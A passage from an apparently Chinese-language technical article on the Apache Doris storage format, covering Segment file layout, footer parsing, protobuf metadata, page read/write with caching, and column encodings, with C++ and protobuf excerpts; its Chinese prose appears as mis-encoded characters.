<li><strong>ç´¢å¼•</strong>ï¼šåŒ…æ‹¬ Ordinal Indexã€Zone Mapã€Bloom Filterã€Bitmap Index ç­‰</li>
</ul>
<hr/>
<h2 data-id="heading-2">2. Segment æ–‡ä»¶æ ¼å¼</h2>
<h3 data-id="heading-3">2.1 æ–‡ä»¶å¸ƒå±€</h3>
<p>ä¸€ä¸ª Segment æ–‡ä»¶çš„å®Œæ•´ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> <span class="hljs-number">0</span> Data       <span class="hljs-operator">|</span>  â† ç¬¬ä¸€åˆ—çš„æ‰€æœ‰ Data Pages
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> <span class="hljs-number">0</span> Index      <span class="hljs-operator">|</span>  â† ç¬¬ä¸€åˆ—çš„ç´¢å¼•ï¼ˆOrdinal, Zone Map, Bitmap, Bloom <span class="hljs-keyword">Filter</span>ï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> <span class="hljs-number">1</span> Data       <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> <span class="hljs-number">1</span> Index      <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>          ...            <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> N Data       <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>     <span class="hljs-keyword">Column</span> N Index      <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>    Short Key Index      <span class="hljs-operator">|</span>  â† çŸ­é”®ç´¢å¼•ï¼ˆç”¨äºå¿«é€Ÿå®šä½è¡Œï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-keyword">Primary</span> Key Index (opt) <span class="hljs-operator">|</span>  â† ä¸»é”®ç´¢å¼•ï¼ˆ<span class="hljs-keyword">Unique</span> Key è¡¨ï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>    Segment Footer       <span class="hljs-operator">|</span>  â† SegmentFooterPB (Protobuf)
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>   Footer Size (<span class="hljs-number">4</span> bytes) <span class="hljs-operator">|</span>  â† uint32, Footer é•¿åº¦
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>  Checksum (<span class="hljs-number">4</span> bytes)     <span class="hljs-operator">|</span>  â† uint32, Footer çš„ CRC32 æ ¡éªŒå’Œ
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span> Magic Number (<span class="hljs-number">4</span> bytes)  <span class="hljs-operator">|</span>  â† "DORS" é­”æ•°
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
</code></pre>
<h3 data-id="heading-4">2.2 Footer è§£æ</h3>
<p>Segment Footer æ˜¯æ•´ä¸ªæ–‡ä»¶çš„å…ƒæ•°æ®ç´¢å¼•ï¼Œå­˜å‚¨åœ¨æ–‡ä»¶æœ«å°¾ã€‚è§£ææµç¨‹å¦‚ä¸‹ï¼š</p>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment.cpp:186-262</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp">Status Segment::_parse_footer(std::shared_ptr&lt;SegmentFooterPB&gt;&amp; footer,
                              OlapReaderStatistics* stats) {
    <span class="hljs-comment">// Footer := SegmentFooterPB | FooterSize(4) | Checksum(4) | MagicNumber(4)</span>
    <span class="hljs-keyword">auto</span> file_size = _file_reader-&gt;<span class="hljs-built_in">size</span>();
    <span class="hljs-keyword">if</span> (file_size &lt; <span class="hljs-number">12</span>) {
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">Corruption</span>(<span class="hljs-string">"Bad segment file: file size {} &lt; 12"</span>, file_size);
    }
    
    <span class="hljs-comment">// 1. è¯»å–æ–‡ä»¶æœ«å°¾ 12 å­—èŠ‚ï¼šFooterSize + Checksum + MagicNumber</span>
    <span class="hljs-type">uint8_t</span> fixed_buf[<span class="hljs-number">12</span>];
    <span class="hljs-type">size_t</span> bytes_read = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_reader-&gt;<span class="hljs-built_in">read_at</span>(file_size - <span class="hljs-number">12</span>, <span class="hljs-built_in">Slice</span>(fixed_buf, <span class="hljs-number">12</span>), 
                                          &amp;bytes_read, &amp;io_ctx));
    
    <span class="hljs-comment">// 2. éªŒè¯ Magic Number</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(fixed_buf + <span class="hljs-number">8</span>, k_segment_magic, k_segment_magic_length) != <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">Corruption</span>(<span class="hljs-string">"Bad segment file: magic number not match"</span>);
    }
    
    <span class="hljs-comment">// 3. è¯»å– Footer PB</span>
    <span class="hljs-type">uint32_t</span> footer_length = <span class="hljs-built_in">decode_fixed32_le</span>(fixed_buf);
    std::string footer_buf;
    footer_buf.<span class="hljs-built_in">resize</span>(footer_length);
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_reader-&gt;<span class="hljs-built_in">read_at</span>(file_size - <span class="hljs-number">12</span> - footer_length, 
                                          footer_buf, &amp;bytes_read, &amp;io_ctx));
    
    <span class="hljs-comment">// 4. éªŒè¯ Checksum</span>
    <span class="hljs-type">uint32_t</span> expect_checksum = <span class="hljs-built_in">decode_fixed32_le</span>(fixed_buf + <span class="hljs-number">4</span>);
    <span class="hljs-type">uint32_t</span> actual_checksum = crc32c::<span class="hljs-built_in">Value</span>(footer_buf.<span class="hljs-built_in">data</span>(), footer_buf.<span class="hljs-built_in">size</span>());
    <span class="hljs-keyword">if</span> (actual_checksum != expect_checksum) {
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">Corruption</span>(<span class="hljs-string">"Bad segment file: checksum mismatch"</span>);
    }
    
    <span class="hljs-comment">// 5. ååºåˆ—åŒ– Footer PB</span>
    footer = std::<span class="hljs-built_in">make_shared</span>&lt;SegmentFooterPB&gt;();
    <span class="hljs-keyword">if</span> (!footer-&gt;<span class="hljs-built_in">ParseFromString</span>(footer_buf)) {
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">Corruption</span>(<span class="hljs-string">"Bad segment file: failed to parse SegmentFooterPB"</span>);
    }
    
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<h3 data-id="heading-5">2.3 SegmentFooterPB ç»“æ„</h3>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:233-249</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">message SegmentFooterPB {
    optional uint32 version = 1 [default = 1]; // æ–‡ä»¶ç‰ˆæœ¬
    repeated ColumnMetaPB columns = 2;         // åˆ—å…ƒæ•°æ®åˆ—è¡¨
    optional uint32 num_rows = 3;              // æ€»è¡Œæ•°
    optional uint64 index_footprint = 4;       // ç´¢å¼•æ€»å¤§å°
    optional uint64 data_footprint = 5;        // æ•°æ®æ€»å¤§å°
    optional uint64 raw_data_footprint = 6;    // åŸå§‹æ•°æ®å¤§å°
    
    optional CompressionTypePB compress_type = 7 [default = LZ4F];
    repeated MetadataPairPB file_meta_datas = 8;
    
    // Short Key Index çš„é¡µæŒ‡é’ˆ
    optional PagePointerPB short_key_index_page = 9;
    
    // Primary Key Index å…ƒæ•°æ®ï¼ˆä»… Unique Key è¡¨ï¼‰
    optional PrimaryKeyIndexMetaPB primary_key_index_meta = 10;
}
</code></pre>
<h3 data-id="heading-6">13.2.4 ColumnMetaPB ç»“æ„</h3>
<p>æ¯ä¸ªåˆ—çš„å…ƒæ•°æ®åŒ…å«äº†åˆ—çš„åŸºæœ¬ä¿¡æ¯å’Œç´¢å¼•ä½ç½®ï¼š</p>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:176-221</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">message ColumnMetaPB {
    optional uint32 column_id = 1;           // åˆ— ID
    optional uint32 unique_id = 2;           // å”¯ä¸€ ID
    optional int32 type = 3;                 // æ•°æ®ç±»å‹ï¼ˆFieldTypeï¼‰
    optional int32 length = 4;               // é•¿åº¦
    optional EncodingTypePB encoding = 5;    // ç¼–ç ç±»å‹
    optional CompressionTypePB compression = 6; // å‹ç¼©ç±»å‹
    optional bool is_nullable = 7;           // æ˜¯å¦å¯ä¸ºç©º
    
    repeated ColumnIndexMetaPB indexes = 8;  // ç´¢å¼•åˆ—è¡¨
    optional PagePointerPB dict_page = 9;    // å­—å…¸é¡µæŒ‡é’ˆï¼ˆå­—å…¸ç¼–ç ï¼‰
    
    repeated ColumnMetaPB children_columns = 10; // å­åˆ—ï¼ˆArray/Map/Structï¼‰
    optional uint64 num_rows = 11;           // è¡Œæ•°
    
    // ç»Ÿè®¡ä¿¡æ¯
    optional uint64 compressed_data_bytes = 24;   // å‹ç¼©åå¤§å°
    optional uint64 uncompressed_data_bytes = 25; // è§£å‹åå¤§å°
    optional uint64 raw_data_bytes = 26;          // åŸå§‹å¤§å°
}
</code></pre>
<hr/>
<h2 data-id="heading-7">3. Page ç»“æ„</h2>
<h3 data-id="heading-8">3.1 Page ç±»å‹</h3>
<p>Doris å®šä¹‰äº†ä»¥ä¸‹ Page ç±»å‹ï¼š</p>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:58-65</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">enum PageTypePB {
    UNKNOWN_PAGE_TYPE = 0;
    DATA_PAGE = 1;           // æ•°æ®é¡µ
    INDEX_PAGE = 2;          // ç´¢å¼•é¡µï¼ˆB-Treeï¼‰
    DICTIONARY_PAGE = 3;     // å­—å…¸é¡µï¼ˆå­—å…¸ç¼–ç ï¼‰
    SHORT_KEY_PAGE = 4;      // çŸ­é”®ç´¢å¼•é¡µ
    PRIMARY_KEY_INDEX_PAGE = 5; // ä¸»é”®ç´¢å¼•é¡µ
}
</code></pre>
<h3 data-id="heading-9">3.2 Data Page å¸ƒå±€</h3>
<p>ä¸€ä¸ªå…¸å‹çš„ Data Page ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>    Encoded <span class="hljs-keyword">Values</span>       <span class="hljs-operator">|</span>  â† ç¼–ç åçš„æ•°æ®ï¼ˆPlain<span class="hljs-operator">/</span>Dict<span class="hljs-operator">/</span>RLE<span class="hljs-operator">/</span>BitShuffleï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>   <span class="hljs-keyword">Null</span> Bitmap (opt)     <span class="hljs-operator">|</span>  â† RLE ç¼–ç çš„ <span class="hljs-keyword">NULL</span> ä½å›¾ï¼ˆå¯é€‰ï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>    Page Footer          <span class="hljs-operator">|</span>  â† PageFooterPB (åºåˆ—åŒ–)
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span> Footer Size (<span class="hljs-number">4</span> bytes)   <span class="hljs-operator">|</span>  â† uint32
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
<span class="hljs-operator">|</span>  Checksum (<span class="hljs-number">4</span> bytes)     <span class="hljs-operator">|</span>  â† uint32, CRC32 æ ¡éªŒå’Œ
<span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span>
</code></pre>
<h3 data-id="heading-10">3.3 PageFooterPB ç»“æ„</h3>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:112-126</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">message PageFooterPB {
    optional PageTypePB type = 1;
    optional uint32 uncompressed_size = 2;  // è§£å‹åå¤§å°
    
    // ä»¥ä¸‹å­—æ®µæ ¹æ® type é€‰æ‹©æ€§å­˜åœ¨
    optional DataPageFooterPB data_page_footer = 7;
    optional IndexPageFooterPB index_page_footer = 8;
    optional DictPageFooterPB dict_page_footer = 9;
    optional ShortKeyFooterPB short_key_page_footer = 10;
}

message DataPageFooterPB {
    optional uint64 first_ordinal = 1;      // èµ·å§‹è¡Œå·
    optional uint64 num_values = 2;         // å€¼æ•°é‡ï¼ˆå« NULLï¼‰
    optional uint32 nullmap_size = 3;       // NULL ä½å›¾å¤§å°
    optional uint64 next_array_item_ordinal = 4; // æ•°ç»„åˆ—ä¸“ç”¨
}
</code></pre>
<h3 data-id="heading-11">3.4 Page å†™å…¥æµç¨‹</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>page_io.cpp:74-116</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Status <span class="hljs-title">PageIO::write_page</span><span class="hljs-params">(io::FileWriter* writer, <span class="hljs-type">const</span> std::vector&lt;Slice&gt;&amp; body,
                          <span class="hljs-type">const</span> PageFooterPB&amp; footer, PagePointer* result)</span> </span>{
    <span class="hljs-comment">// 1. åºåˆ—åŒ– Footer</span>
    std::string footer_buf;
    footer.<span class="hljs-built_in">SerializeToString</span>(&amp;footer_buf);
    <span class="hljs-built_in">put_fixed32_le</span>(&amp;footer_buf, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(footer_buf.<span class="hljs-built_in">size</span>()));
    
    <span class="hljs-comment">// 2. ç»„è£… Pageï¼šbody + footer + checksum</span>
    std::vector&lt;Slice&gt; page = body;
    page.<span class="hljs-built_in">emplace_back</span>(footer_buf);
    
    <span class="hljs-comment">// 3. è®¡ç®— Checksum</span>
    <span class="hljs-type">uint8_t</span> checksum_buf[<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint32_t</span>)];
    <span class="hljs-type">uint32_t</span> checksum = crc32c::<span class="hljs-built_in">Value</span>(page);
    <span class="hljs-built_in">encode_fixed32_le</span>(checksum_buf, checksum);
    page.<span class="hljs-built_in">emplace_back</span>(checksum_buf, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint32_t</span>));
    
    <span class="hljs-comment">// 4. å†™å…¥æ–‡ä»¶</span>
    <span class="hljs-type">uint64_t</span> offset = writer-&gt;<span class="hljs-built_in">bytes_appended</span>();
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(writer-&gt;<span class="hljs-built_in">appendv</span>(&amp;page[<span class="hljs-number">0</span>], page.<span class="hljs-built_in">size</span>()));
    
    <span class="hljs-comment">// 5. è®°å½• Page ä½ç½®</span>
    result-&gt;offset = offset;
    result-&gt;size = <span class="hljs-built_in">cast_set</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(writer-&gt;<span class="hljs-built_in">bytes_appended</span>() - offset);
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<h3 data-id="heading-12">3.5 Page è¯»å–ä¸ç¼“å­˜</h3>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>page_io.cpp:127-263</code></a></p>
<p>Page è¯»å–æ”¯æŒä¸‰çº§ç¼“å­˜ä¼˜åŒ–ï¼š</p>
<ol>
<li><strong>PageCache</strong>ï¼šå†…å­˜ä¸­çš„ Page ç¼“å­˜ï¼Œå­˜å‚¨è§£å‹åçš„ Page</li>
<li><strong>FileCache</strong>ï¼šæ–‡ä»¶å—ç¼“å­˜ï¼Œå­˜å‚¨åŸå§‹å‹ç¼©æ•°æ®</li>
<li><strong>Remote Storage</strong>ï¼šè¿œç¨‹å­˜å‚¨ï¼ˆS3/HDFSï¼‰</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">Status <span class="hljs-title">PageIO::read_and_decompress_page_</span><span class="hljs-params">(<span class="hljs-type">const</span> PageReadOptions&amp; opts, PageHandle* handle,
                                         Slice* body, PageFooterPB* footer)</span> </span>{
    <span class="hljs-comment">// 1. å°è¯•ä» PageCache è¯»å–</span>
    <span class="hljs-keyword">auto</span> cache = StoragePageCache::<span class="hljs-built_in">instance</span>();
    PageCacheHandle cache_handle;
    <span class="hljs-function">StoragePageCache::CacheKey <span class="hljs-title">cache_key</span><span class="hljs-params">(opts.file_reader-&gt;path().native(),
                                         opts.file_reader-&gt;size(), opts.page_pointer.offset)</span></span>;
    <span class="hljs-keyword">if</span> (opts.use_page_cache &amp;&amp; cache &amp;&amp; cache-&gt;<span class="hljs-built_in">lookup</span>(cache_key, &amp;cache_handle, opts.type)) {
        *handle = <span class="hljs-built_in">PageHandle</span>(std::<span class="hljs-built_in">move</span>(cache_handle));
        opts.stats-&gt;cached_pages_num++;
        <span class="hljs-comment">// è§£æ body å’Œ footer</span>
        Slice page_slice = handle-&gt;<span class="hljs-built_in">data</span>();
        <span class="hljs-type">uint32_t</span> footer_size = <span class="hljs-built_in">decode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)page_slice.data + page_slice.size - <span class="hljs-number">4</span>);
        *body = <span class="hljs-built_in">Slice</span>(page_slice.data, page_slice.size - <span class="hljs-number">4</span> - footer_size);
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// 2. ä»æ–‡ä»¶è¯»å–</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> page_size = opts.page_pointer.size;
    std::unique_ptr&lt;DataPage&gt; page = std::<span class="hljs-built_in">make_unique</span>&lt;DataPage&gt;(page_size, ...);
    <span class="hljs-function">Slice <span class="hljs-title">page_slice</span><span class="hljs-params">(page-&gt;data(), page_size)</span></span>;
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(opts.file_reader-&gt;<span class="hljs-built_in">read_at</span>(opts.page_pointer.offset, page_slice, 
                                              &amp;bytes_read, &amp;opts.io_ctx));
    
    <span class="hljs-comment">// 3. éªŒè¯ Checksum</span>
    <span class="hljs-keyword">if</span> (opts.verify_checksum) {
        <span class="hljs-type">uint32_t</span> expect = <span class="hljs-built_in">decode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)page_slice.data + page_slice.size - <span class="hljs-number">4</span>);
        <span class="hljs-type">uint32_t</span> actual = crc32c::<span class="hljs-built_in">Value</span>(page_slice.data, page_slice.size - <span class="hljs-number">4</span>);
        <span class="hljs-keyword">if</span> (expect != actual) {
            <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">Corruption</span>(<span class="hljs-string">"Bad page: checksum mismatch"</span>);
        }
    }
    
    <span class="hljs-comment">// 4. è§£å‹ç¼©ï¼ˆå¦‚æœéœ€è¦ï¼‰</span>
    <span class="hljs-keyword">if</span> (body_size != footer-&gt;<span class="hljs-built_in">uncompressed_size</span>()) {
        std::unique_ptr&lt;DataPage&gt; decompressed_page = 
            std::<span class="hljs-built_in">make_unique</span>&lt;DataPage&gt;(footer-&gt;<span class="hljs-built_in">uncompressed_size</span>() + footer_size + <span class="hljs-number">4</span>, ...);
        <span class="hljs-function">Slice <span class="hljs-title">compressed_body</span><span class="hljs-params">(page_slice.data, body_size)</span></span>;
        <span class="hljs-function">Slice <span class="hljs-title">decompressed_body</span><span class="hljs-params">(decompressed_page-&gt;data(), footer-&gt;uncompressed_size())</span></span>;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(opts.codec-&gt;<span class="hljs-built_in">decompress</span>(compressed_body, &amp;decompressed_body));
        page = std::<span class="hljs-built_in">move</span>(decompressed_page);
    }
    
    <span class="hljs-comment">// 5. é¢„è§£ç ï¼ˆBitShuffle ç­‰ï¼‰</span>
    <span class="hljs-keyword">if</span> (opts.pre_decode &amp;&amp; encoding_info) {
        <span class="hljs-keyword">auto</span>* pre_decoder = encoding_info-&gt;<span class="hljs-built_in">get_data_page_pre_decoder</span>();
        <span class="hljs-keyword">if</span> (pre_decoder) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(pre_decoder-&gt;<span class="hljs-built_in">decode</span>(&amp;page, &amp;page_slice, ...));
        }
    }
    
    <span class="hljs-comment">// 6. åŠ å…¥ PageCache</span>
    <span class="hljs-keyword">if</span> (opts.use_page_cache &amp;&amp; cache) {
        cache-&gt;<span class="hljs-built_in">insert</span>(cache_key, page.<span class="hljs-built_in">get</span>(), &amp;cache_handle, opts.type, opts.kept_in_memory);
        *handle = <span class="hljs-built_in">PageHandle</span>(std::<span class="hljs-built_in">move</span>(cache_handle));
    }
    
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<hr/>
<h2 data-id="heading-13">4. åˆ—ç¼–ç </h2>
<h3 data-id="heading-14">4.1 ç¼–ç ç±»å‹</h3>
<p>Doris æ”¯æŒå¤šç§åˆ—ç¼–ç æ–¹å¼ä»¥æé«˜å‹ç¼©ç‡å’ŒæŸ¥è¯¢æ€§èƒ½ï¼š</p>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:34-44</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">enum EncodingTypePB {
    UNKNOWN_ENCODING = 0;
    DEFAULT_ENCODING = 1;     // æ ¹æ®æ•°æ®ç±»å‹é€‰æ‹©é»˜è®¤ç¼–ç 
    PLAIN_ENCODING = 2;       // ä¸ç¼–ç ï¼Œç›´æ¥å­˜å‚¨
    PREFIX_ENCODING = 3;      // å‰ç¼€ç¼–ç ï¼ˆå­—ç¬¦ä¸²ï¼‰
    RLE = 4;                  // Run-Length Encoding
    DICT_ENCODING = 5;        // å­—å…¸ç¼–ç 
    BIT_SHUFFLE = 6;          // ä½é‡æ’
    FOR_ENCODING = 7;         // Frame-Of-Reference
    PLAIN_ENCODING_V2 = 8;    // å¸¦å˜é•¿å‰ç¼€çš„ Plain
}
</code></pre>
<h3 data-id="heading-15">4.2 Plain Encoding</h3>
<p><strong>æœ€ç®€å•çš„ç¼–ç æ–¹å¼ï¼Œç›´æ¥å­˜å‚¨åŸå§‹æ•°æ®</strong>ã€‚</p>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<code>be/src/olap/rowset/segment_v2/plain_page.h</code></p>
<h4 data-id="heading-16">Page æ ¼å¼</h4>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-addition">+-----------------------+</span>
| num_values (4 bytes)  |  â† uint32ï¼Œå€¼çš„æ•°é‡
<span class="hljs-addition">+-----------------------+</span>
| value[0]              |  â† ç¬¬ä¸€ä¸ªå€¼
<span class="hljs-addition">+-----------------------+</span>
| value[1]              |
<span class="hljs-addition">+-----------------------+</span>
|        ...            |
<span class="hljs-addition">+-----------------------+</span>
| value[n-1]            |
<span class="hljs-addition">+-----------------------+</span>
</code></pre>
<h4 data-id="heading-17">å†™å…¥å®ç°</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType Type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PlainPageBuilder</span> : <span class="hljs-keyword">public</span> PageBuilderHelper&lt;PlainPageBuilder&lt;Type&gt;&gt; {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* vals, <span class="hljs-type">size_t</span>* count)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">size_t</span> old_size = _buffer.<span class="hljs-built_in">size</span>();
        <span class="hljs-type">size_t</span> to_add = std::<span class="hljs-built_in">min</span>(_remain_element_capacity, *count);
        _buffer.<span class="hljs-built_in">resize</span>(old_size + to_add * SIZE_OF_TYPE);
        <span class="hljs-comment">// ç›´æ¥æ‹·è´åŸå§‹æ•°æ®</span>
        <span class="hljs-built_in">memcpy</span>(&amp;_buffer[old_size], vals, to_add * SIZE_OF_TYPE);
        _count += to_add;
        *count = to_add;
        _remain_element_capacity -= to_add;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(OwnedSlice* slice)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// å†™å…¥ count åˆ°å¤´éƒ¨</span>
        <span class="hljs-built_in">encode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)&amp;_buffer[<span class="hljs-number">0</span>], <span class="hljs-built_in">cast_set</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(_count));
        <span class="hljs-keyword">if</span> (_count &gt; <span class="hljs-number">0</span>) {
            _first_value.<span class="hljs-built_in">assign_copy</span>(&amp;_buffer[PLAIN_PAGE_HEADER_SIZE], SIZE_OF_TYPE);
            _last_value.<span class="hljs-built_in">assign_copy</span>(&amp;_buffer[PLAIN_PAGE_HEADER_SIZE + (_count - <span class="hljs-number">1</span>) * SIZE_OF_TYPE], 
                                   SIZE_OF_TYPE);
        }
        *slice = _buffer.<span class="hljs-built_in">build</span>();
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<h4 data-id="heading-18">è¯»å–å®ç°</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">template</span> &lt;FieldType Type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PlainPageDecoder</span> : <span class="hljs-keyword">public</span> PageDecoder {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// è§£æå¤´éƒ¨ï¼Œè·å– num_values</span>
        _num_values = <span class="hljs-built_in">decode_fixed32_le</span>((<span class="hljs-type">uint8_t</span>*)_data.data);
        _parsed = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">seek_to_position_in_page</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> pos)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-built_in">DCHECK</span>(_parsed);
        <span class="hljs-built_in">DCHECK_LE</span>(pos, _num_values);
        _cur_idx = pos;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">next_batch</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* n, ColumnBlockView* dst)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-built_in">DCHECK</span>(_parsed);
        <span class="hljs-type">size_t</span> to_read = std::<span class="hljs-built_in">min</span>(*n, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">size_t</span>&gt;(_num_values - _cur_idx));
        <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* src = &amp;_data.data[PLAIN_PAGE_HEADER_SIZE + _cur_idx * SIZE_OF_TYPE];
        <span class="hljs-comment">// æ‰¹é‡æ‹·è´æ•°æ®</span>
        <span class="hljs-built_in">memcpy</span>(dst-&gt;<span class="hljs-built_in">data</span>(), src, to_read * SIZE_OF_TYPE);
        _cur_idx += to_read;
        *n = to_read;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æ•°å€¼ç±»å‹ï¼ˆINT, BIGINT, DOUBLEï¼‰</li>
<li>æ•°æ®éšæœºæ€§å¼ºï¼Œéš¾ä»¥å‹ç¼©</li>
<li>éœ€è¦å¿«é€Ÿè®¿é—®</li>
</ul>
<hr/>
<h3 data-id="heading-19">4.3 Dictionary Encoding</h3>
<p><strong>å­—å…¸ç¼–ç å°†é‡å¤å€¼å­˜å‚¨åœ¨å­—å…¸ä¸­ï¼Œæ•°æ®é¡µåªå­˜å‚¨å­—å…¸ç´¢å¼•</strong>ã€‚</p>
<h4 data-id="heading-20">Page æ ¼å¼</h4>
<pre><code class="hljs language-sql" lang="sql">Dictionary Page:
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>
<span class="hljs-operator">|</span> Plain Encoded <span class="hljs-keyword">Values</span>  <span class="hljs-operator">|</span>  â† å­—å…¸å€¼åˆ—è¡¨ï¼ˆPlain Encodingï¼‰
<span class="hljs-operator">+</span><span class="hljs-comment">-----------------------+</span>

Data Page:
